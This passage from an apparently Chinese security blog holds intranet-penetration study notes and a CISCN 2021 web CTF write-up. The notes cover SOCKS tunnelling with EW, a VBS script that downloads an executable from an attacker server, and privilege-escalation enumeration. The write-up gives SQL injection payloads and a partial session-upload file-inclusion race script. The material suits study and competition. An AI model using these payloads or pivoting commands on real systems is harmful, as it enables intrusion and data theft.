class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. 正向 SOCKS5 服务器</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 适用于目标机器拥有一个外网 IP 的情况</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 执行以下命令，即可架设一个端口为 888 的 SOCKS 代理，接下来，使用 SocksCap64 添加这个 IP 地址的代理即可</span></span></span><br><span class="line">ew -s ssocksd -l 888</span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. 反弹 SOCKS5 服务器</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 目标机器没有公网 IP 的情况（使其可以访问内网资源）</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 在公网 VPS 上添加一个转接隧道，把 1080 端口收到的代理请求转发给 888 端口</span></span></span><br><span class="line">ew -s rcsocks -l 1008 -e 888</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 在 Web 服务器上启动 SOCKS5 服务，然后反弹到 VPS 的 888 端口</span></span></span><br><span class="line">ew -s rcsocks -d VPS-IP -e 888</span><br><span class="line"><span class="meta">#</span><span class="bash"> 3. 二级网络环境（a）</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 如果已经获得 A 主机与 B 主机权限，A 拥有两块网卡，一块通外网，一块只通 B，而 B 只可以访问内网资源</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 在 B 中，利用 ssocksd 方式启动 888 的 SOCKS 代理</span></span></span><br><span class="line">ew -s ssocksd -l 888</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 在 A 中，将 1080 端口收到的代理请求转发给 B 的 888 端口，即可通过 A 的外网 1080 端口使用 B 上架设的 SOCKS5 代理了</span></span></span><br><span class="line">ew -s lcx_tran -l 1080 -f B-IP -g 888</span><br><span class="line"><span class="meta">#</span><span class="bash"> 4。 二级网络环境（b）</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 如果已经获得 A 主机与 B 主机权限，A 既没有公网 IP 地址，也无法访问内网资源，B 只可以访问内网资源</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 首先在公网 VPS 中添加转接隧道，将 10800 端口收到的代理请求转发给 888 端口</span></span></span><br><span class="line">ew -s lcx_listen -l 10800 -e 888</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># B 中，利用 ssocksd 方式启动 999 端口的 SOCKS 代理</span></span></span><br><span class="line">ew -s ssocksd -l 999</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># A 中，利用 lcx_slave 方式将公网 VPS 的 888 端口和 B 主机的 999 端口连接起来，接下来就可以通过访问公网 VPS 的 10800 端口使用在 B 上架设的 SOCKS5 代理了</span></span></span><br><span class="line">ew -s lcx_slave -d VPS-IP -e 888 -f B-IP -g 999</span><br><span class="line"><span class="meta">#</span><span class="bash"> 5. 三级网络环境</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># A 没有公网 IP，可以访问外网，B 不能访问外网，但可以被 A 访问，C 可被 B 访问，而且可以访问核心区域</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># VPS 中，将 1080 端口收到的代理请求转发给 888 端口</span></span></span><br><span class="line">ew -s rcsocks -l 1080 -e 888</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># A 中，将公网 VPS 的 888 端口和 B 的 999 端口连接起来</span></span></span><br><span class="line">ew -s lcx_slave -d VPS-IP -e 888 -f B-IP -g 999</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># B 中，将 999 端口收到的代理请求转发给 777 端口</span></span></span><br><span class="line">ew -s lcx_listen -l 999 -e 777</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># C 中，启动 SOCKS5 服务，并反弹到 B 的 777 端口，接下来就可以通过访问公网 VPS 的 1080 端口使用在 C 上架设的 SOCKS5 代理了</span></span></span><br><span class="line">ew -s rssocks -d B-IP -e 777</span><br></pre></td></tr></table></figure><h3 id="上传和下载"><a href="#上传和下载" class="headerlink" title="上传和下载"></a>上传和下载</h3><p>对于不能上传 Shell，但是可以执行命令的 Windows 服务器（而且唯一的入口就是命令行环境），可以在 Shell 命令行环境中对目标服务器进行上传和下载操作</p><h4 id="利用-FTP-协议上传"><a href="#利用-FTP-协议上传" class="headerlink" title="利用 FTP 协议上传"></a>利用 FTP 协议上传</h4><p>在本地或者 VPS 上搭建 FTP 服务器，常用的 FTP 命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">open &lt;服务器地址&gt;  # 连接服务器</span><br><span class="line">cd &lt;目录名&gt;  # 进入指定目录</span><br><span class="line">lcd &lt;文件夹路径&gt;  # 定位本地文件夹（上传文件的位置或者下载文件的本地位置）</span><br><span class="line">type  # 查看当前的传输方式（默认为 ASCII 码传输）</span><br><span class="line">ascii  # 设置传输方式为 ASCII 码传输（传 TXT 等格式的文件）</span><br><span class="line">binary  # 设置传输方式为二进制传输（传输 EXE 文件，以及图片、视/音频文件等）</span><br><span class="line">close  # 结束与服务器的 FTP 会话</span><br><span class="line">quit  # 结束与服务器的 FTP 会话并退出 FTP 环境</span><br><span class="line">put &lt;文件名&gt; [newname]  # 上传，newname 为保存时的新名字，若不指定将以原名保存</span><br><span class="line">send &lt;文件名&gt; [newname]  # 上传，newname 为保存时的新名字，若不指定将以原名保存</span><br><span class="line">get &lt;文件名&gt; [newname]  # 下载，newname 为保存时的新名字，若不指定将以原名保存</span><br><span class="line">mget filename [filename ...]  # 下载多个文件，mget 命令支持空格和&quot;?&quot;两个通配符，例如 &quot;mget .mp3&quot; 表示下载 FTP 服务器当前目录下所有扩展名为&quot;.mp3&quot;的文件</span><br></pre></td></tr></table></figure><h4 id="利用-VBS-上传"><a href="#利用-VBS-上传" class="headerlink" title="利用 VBS 上传"></a>利用 VBS 上传</h4><p>VBS 脚本主要使用 msxm12.xmlhttp &amp; adodb.stream 对象</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span> Post = <span class="built_in">CreateObject</span>(<span class="string">&quot;Msxm12.XMLHTTP&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> Shell = <span class="built_in">CreateObject</span>(<span class="string">&quot;Wscript.Shell&quot;</span>)</span><br><span class="line">Post.Open <span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://server_ip/target.exe&quot;</span>,<span class="number">0</span></span><br><span class="line">Post.Send()</span><br><span class="line"><span class="keyword">Set</span> aGet = <span class="built_in">CreateObject</span>(<span class="string">&quot;ADODB.Stream&quot;</span>)</span><br><span class="line">aGet.Mode = <span class="number">3</span></span><br><span class="line">aGet.Type = <span class="number">1</span></span><br><span class="line">aGet.Open()</span><br><span class="line">aGet.Write(Post.responseBody)</span><br><span class="line">aGet.SaveToFile <span class="string">&quot;C:\test\target.exe&quot;</span>,<span class="number">2</span></span><br></pre></td></tr></table></figure><p>在目标服务器的 Shell 命令行中用 &gt; 和 &gt;&gt; 逐行输入文件 download.vbs，然后执行 <code>Csript download.vbs</code> 即可在目标服务器中下载 VPS 上的 target.exe</p><h4 id="利用-Debug-上传"><a href="#利用-Debug-上传" class="headerlink" title="利用 Debug 上传"></a>利用 Debug 上传</h4><p>将需要上传的 exe 文件转换为 hex 形式，再通过 echo 命令将其写入文件，最后通过 Debug 功能将 hex 代码编译并还原成 exe 文件</p><p>该工具的功能列举：</p><ul><li>直接输入、修改、跟踪、运行汇编语言源程序</li><li>查看操作系统中的内容</li><li>查看 ROM BIOS 的内容</li><li>查看、修改 RAM 内部的设置值</li><li>以扇区或文件的方式读/写软盘数据</li><li>将十六进制代码转换为可执行文件（hex）</li></ul><p>在 KaLi 中，exe2bat.exe 工具位于 /usr/share/windows-binaries 目录下，在该目录下执行，将需要上传的 xxx.exe 文件转换成 hex 形式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wine exe2bat.exe xxx.exe xxx.txt</span><br></pre></td></tr></table></figure><p>然后利用目标服务器的 Debug 功能还原</p><p>使用 Debug 是一种比较老的方法，exe2bat.exe 只支持小于 64K 的文件，大了的话会报错</p><h4 id="利用-Nishang-bitsadmin-PowerShell-上传"><a href="#利用-Nishang-bitsadmin-PowerShell-上传" class="headerlink" title="利用 Nishang / bitsadmin / PowerShell 上传"></a>利用 Nishang / bitsadmin / PowerShell 上传</h4><ul><li>Nishang 中的下载执行脚本 Downoad_Execute</li><li>命令行工具 bitsadmin（Windows XP 以后的版本 Windows 自带（Windows Update 就是用它下载文件），推荐在 Windows7 和 Windows8 主机上使用）</li><li>以 .NET 框架为基础的 PowerShell（在 Windows Server 2003 以后版本默认自带）</li></ul><h2 id="权限提升分析防御"><a href="#权限提升分析防御" class="headerlink" title="权限提升分析防御"></a>权限提升分析防御</h2><p>在 Windwos 中，权限大概分为四种，分别是 User、Administrator、System、TrustedInstaller，通常我们接触的是前三种，第四种在常规使用中通常不会涉及</p><ul><li>User：普通用户权限，是系统中最安全的权限（因为分配给改组的默认权限不允许成员修改操作系统的设置或者用户资料）</li><li>Administrator：管理员权限，可以利用 Windows 的机制将自己提升为 System 权限，一边操作 SAM 文件等</li><li>System：系统权限，可以对 SAM 等敏感文件进行读取，往往需要将 Administrator 权限提升到 System 权限才可以对散列值进行 Dump 操作</li><li>TrustedInstaller：Windows 的最高权限，对系统文件，即使拥有 System 权限也无法进行修改，只有拥有 TrustedInstaller 权限的用户才可以修改系统文件</li></ul><p>常用提权方法：</p><ul><li>系统内核溢出漏洞提权</li><li>数据库提权</li><li>错误的系统配置提权</li><li>组策略首选项提权</li><li>Web 中间件漏洞填权</li><li>DLL 劫持提权</li><li>滥用高权限令牌提权</li><li>第三方软件/服务提权</li></ul><h3 id="系统内核溢出漏洞提权分析"><a href="#系统内核溢出漏洞提权分析" class="headerlink" title="系统内核溢出漏洞提权分析"></a>系统内核溢出漏洞提权分析</h3><h4 id="通过手动执行命令发现缺失补丁"><a href="#通过手动执行命令发现缺失补丁" class="headerlink" title="通过手动执行命令发现缺失补丁"></a>通过手动执行命令发现缺失补丁</h4><p>查看当前权限，<code>whoami /groups</code>，我们需要从 Mandatory Label\Medium Mandatory Level 提升到 Mandatory Label\High Mandatory Level，我们可以通过 <code>systeminfo</code> 或者 <code>Wmic gfe get Caption,Description,HotFixIp,InstalledOn</code> 查询补丁</p><p>攻击者一般采取的利用方式为：寻找提权的 EXP，将已安装的补丁编号与提权的 EXP 编号进行对比，例如 KiTrap0D 和 kB9796682、MS11-011 和 KB2393802、MS11-080 和 KB2592799、MS10-021 和 KB2592799，然后使用没有编号的 EXO 进行提权</p><p>常见 EXP：<a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p><h4 id="利用-Metaspoit-发现缺失补丁"><a href="#利用-Metaspoit-发现缺失补丁" class="headerlink" title="利用 Metaspoit 发现缺失补丁"></a>利用 Metaspoit 发现缺失补丁</h4><p>post/windows/gather/enum_patches 模块</p><h4 id="Windows-Expoit-Suggester"><a href="#Windows-Expoit-Suggester" class="headerlink" title="Windows Expoit Suggester"></a>Windows Expoit Suggester</h4><p><a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a></p><p>使用 systeminfo 命令获取信息并导入 patches.txt 文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">py wes.py --update  # 自动下载安全公告数据库，下载的文件会自动在当前目录以 Excel 的形式保存</span><br><span class="line">pip install xlrd -upgrade  # 安装 xlrd 模块</span><br><span class="line">py wes.py -d 2019-02-02-mssb.xls -i patches.txt  # 预处理，检查系统中是否存在未修复的漏洞</span><br></pre></td></tr></table></figure><p>msf 还内置了 local_expoit_suggester 模块，可以用于快速识别系统中可能被利用的漏洞</p><h4 id="PowerShell-的-Sherlock-脚本"><a href="#PowerShell-的-Sherlock-脚本" class="headerlink" title="PowerShell 的 Sherlock 脚本"></a>PowerShell 的 Sherlock 脚本</h4><p><a href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> sherlock.ps1</span><br><span class="line"><span class="built_in">Find-AllVulns</span></span><br></pre></td></tr></table></figure><h3 id="Windows-操作系统配置错误利用分析"><a href="#Windows-操作系统配置错误利用分析" class="headerlink" title="Windows 操作系统配置错误利用分析"></a>Windows 操作系统配置错误利用分析</h3><h4 id="系统服务权限配置错误"><a href="#系统服务权限配置错误" class="headerlink" title="系统服务权限配置错误"></a>系统服务权限配置错误</h4><p>系统服务权限配置漏洞（可写目录漏洞）有如下两种可能</p><ul><li>服务未运行：攻击者会使用任意服务替换原来的服务，然后重启服务</li><li>服务正在运行且无法被终止：这种情况符合绝大多数的漏洞利用场景，攻击者通常会利用 DLL 劫持技术并尝试重启服务来提权</li></ul><h3 id="提权这里先鸽了，属实不知道怎么写"><a href="#提权这里先鸽了，属实不知道怎么写" class="headerlink" title="提权这里先鸽了，属实不知道怎么写"></a>提权这里先鸽了，属实不知道怎么写</h3><h2 id="域内横向移动分析及防御"><a href="#域内横向移动分析及防御" class="headerlink" title="域内横向移动分析及防御"></a>域内横向移动分析及防御</h2><h3 id="常用-Windows-远程连接和相关命令"><a href="#常用-Windows-远程连接和相关命令" class="headerlink" title="常用 Windows 远程连接和相关命令"></a>常用 Windows 远程连接和相关命令</h3>]]></content>
      
      
      <categories>
          
          <category> 智慧的收藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 肾透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_CISCN_WEB_WP</title>
      <link href="2021/05/15/2021-CISCN-WEB-WP/"/>
      <url>2021/05/15/2021-CISCN-WEB-WP/</url>
      
        <content type="html"><![CDATA[<p>国赛。</p><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>无列名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39;) or extractvalue(1,concat(0x7e,(select * from(select * from flag a join (select * from flag)b using(id,no))c),0x7e)) %23</span><br><span class="line">1&#39;) or extractvalue(1,concat(0x7e,(select &#96;4a9ad912-9910-4909-82f4-0fe381be9798&#96; from flag),0x7e)) %23</span><br><span class="line">1&#39;) or extractvalue(1,concat(0x7e,(select substr((select &#96;4a9ad912-9910-4909-82f4-0fe381be9798&#96;  from flag),12)),0x7e)) %23</span><br></pre></td></tr></table></figure><p>拼接得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CISCN&#123;x4lPe-j6y1T-ThuQ3-Dhd30-ZlZSt-&#125;</span><br></pre></td></tr></table></figure><h2 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h2><p>原题，<a href="https://r0yanx.com/2020/10/28/fslh-writeup/">https://r0yanx.com/2020/10/28/fslh-writeup/</a></p><p>swo 源码泄露</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">本题目没有其他代码了噢，就只有这一个文件，虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$c</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">h</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">j</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">k</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">m</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">p</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">q</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rc</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rc&quot;</span>];</span><br><span class="line"><span class="variable">$rb</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rb&quot;</span>];</span><br><span class="line"><span class="variable">$ra</span>=<span class="variable">$_GET</span>[<span class="string">&quot;ra&quot;</span>];</span><br><span class="line"><span class="variable">$rd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rd&quot;</span>];</span><br><span class="line"><span class="variable">$method</span>= <span class="keyword">new</span> <span class="variable">$rc</span>(<span class="variable">$ra</span>, <span class="variable">$rb</span>);</span><br><span class="line">var_dump(<span class="variable">$method</span>-&gt;<span class="variable">$rd</span>());</span><br></pre></td></tr></table></figure><p>猜测 flag 藏在类注释中，所以我们可以利用 php 内置类 <code>ReflectionMethod</code> 的 <code>getDocComment</code> 函数来读取 User 类中各个函数的注释，可以构造： <code>?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment</code>（这里用 <code>__toString</code> 也彳亍）</p><p>逐个函数爆破：</p><p><img src="https://i.loli.net/2021/05/15/uEINUml17zMovrd.png"></p><p>flag 在 q 里面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CISCN&#123;TpVpe-HP8w2-3kFCF-4EZTO-hyAy0-&#125;</span><br></pre></td></tr></table></figure><h2 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h2><p>.listing 信息搜集，session.upload_progress 文件包含利用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">sessid = <span class="string">&#x27;233333333333&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cf&quot;</span>: <span class="string">f&quot;../../../../../var/lib/php/sessions/acafaecced/sess_<span class="subst">&#123;sessid&#125;</span>&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27; &#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://123.60.215.249:25900/&#x27;</span>,</span><br><span class="line">                            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php var_dump(readfile(&quot;/etc/acgfdffhbd/gfediefagf/hedbfegbjb/eegcbdabad/ibadcafecb/fl444444g&quot;)); ?&gt;&#x27;</span>&#125;,</span><br><span class="line">                            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;help.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line">        <span class="comment"># resp = session.post(&#x27;http://123.60.215.249:25900/&#x27;, data=&#123; &#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php var_dump(</span></span><br><span class="line">        <span class="comment"># 